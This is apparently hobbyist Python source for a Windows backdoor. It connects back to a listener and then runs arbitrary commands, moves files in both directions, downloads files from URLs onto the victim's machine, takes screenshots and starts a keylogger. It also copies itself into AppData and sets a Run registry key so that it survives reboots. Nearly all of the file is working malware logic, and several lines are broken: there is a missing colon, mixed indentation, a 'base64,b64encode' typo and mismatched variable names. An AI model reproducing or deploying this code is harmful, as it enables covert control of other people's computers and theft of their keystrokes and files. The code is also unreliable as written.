
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss

def Connection(): # The purpose of this function is to keep our connection persistent either the target end our task  
	while True:   # or if the target click on the program 3 hours before and we connect after 3 hour later even then 
		time.sleep(15) # we will be able to connect with the target because of with the help of this function, it 
		               # will keep connecting us with the target after every 15 seconds. 
		try:          
			sock.connect(("127.0.0.1",54321))
			print("Connection to Server Established")
			Shell()

		except:
			Connection()


def reliable_send(data) :
	json_data=json.dumps(data)
	sock.send(json_data)


def reliable_recv() :
	json_data=""
	while True:
		try:
			json_data=json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError :
			continue

def is_admin():
	global admin

	try:
		temp=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin="[!!] User Privileges"
	else:
		admin="[+] Administrator Privileges!"


def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def download(url) : 
	get_response=requests.get(url) # This is download function used in the shell function for downloading the file from the internet
	file_name = url.split("/")[-1] # This "split method" will split our given URL into the file which we excatly wants to download like
	with open(file_name, "wb") as out_file # "https://www.etc.com/winrar.exe" so we actually wants to download winrar.exe so this method will split it. 
	out_file.write(get_response.content)

def Shell() :
	while True:
		command=reliable_recv()
		if command=="q":
			try:
				os.remove(keylogger_path) # This will also remove the keylogger.txt from roaming folder when you close the session. 
			except:
				continue
			break
        
        elif command=="help":
        	help_options= '''			 download path --> Download A File From Target PC
        					 upload path   --> Upload A File To Target PC
        					 get url       --> Download A File to Target PC From Any Website
        					 start path    --> Start A Program On Target PC i.e caluclator,notepad and etc
        					 screenshot    --> Take a Screenshot of Target Monitor
        					 check         --> Check For Administrative Privileges
        					 keylog_start  --> Start keylogger on Target PC.
        					 keylog_dump   --> Print out Keystrokes Captured By Keylogger.
        					 q             --> Press q to end the session.'''
        	reliable_send(help_options)				  
       
        elif command[:2]=="cd" and len(command) > 1:
        	try:
        		os.chdir(command[3:])
        	except:
        		continue

        elif command[:8]=="download": # length of download is 8
        	with open(command[9:], "rb" ) as file: # after download mean from 9th character read the path from which file to be downloded.
        		reliable_send(base64,b64encode(file.read())) # encrypting the file to base64 encryption.

        elif command[:6]=="upload": # For Upload files on Target system. 
        	with open(command[7:],"wb") as fin:
        		result=reliable_recv()
        		fin.write(base64,b64decode(result))

        elif command[:3]=="get" : # This is for downloading files from the internet in target system using target machine resources.
        	try:
        		download(command[4:])
        		reliable_send("[+] File has been downloded from Specified URL!")	
			except:
				reliable_send("[!!!] Failed To Download File")

		elif command[:5]=="start": # This is for opening the programs like calculator , notepad and etc in target's machine.
			try:
				subprocess.Popen(command[6:] , shell=True)
				reliable_send("[+] Program Started!")
			except:
				reliable_send("[!!!] Program Failed to Start")	

		elif command[:10]=="screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as ss:
					reliable_send(base64,b64encode(ss.read()))
				os.remove("monitor-1.png")	
			except:
				reliable_send("[!!] Failed To Take That Screenshot")	

		elif command[:5]=="check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant Perform the check")

        elif command[:12]=="keylog_start": # This will start the keylogger .
        	t1=threading.Thread(target=keylogger.start)
        	t1.start()

        elif command[:11]=="keylog_dump": # This will read what keylogger has listened.
        	fn=open(keylogger_path,"r")
        	reliable_send(fn.read())

		else:
			try:
				proc=subprocess.Popen(command ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result=proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("[!!] Can't Execute That Command")


keylogger_path=os.environ["appdata"] + "\\keylogger.txt"
location=os.environ["appdata"] + "\\Backdoor.exe" # Here the use of os.environ function is that in windows 
												  # we will copy our backdoor file in Roaming folder because this is a 
												  # hidden folder in windows .Like this is my location where this folder 
                                                  # locates C:\Users\haris\AppData\Roaming but here the problem is how to replace the 
                                                  # the target username so for this we are using "os.environ" function for this purpose.

if not os.path.exists(location):
		shutil.copyfile(sys.executable,location)  # This function will copy our file from desktop to the mentioned location so that target can not delete our Backdoor program.  
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+Location+'"',Shell=True) # This is used to call a subprocess of 
																																 # our program at the Windows process called "Registry Editor" this is  
                                 																								 # where all the backdoors and viruses operates on your PC if their is one.
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) # After this all connection will be created.
Connection()
sock.close()
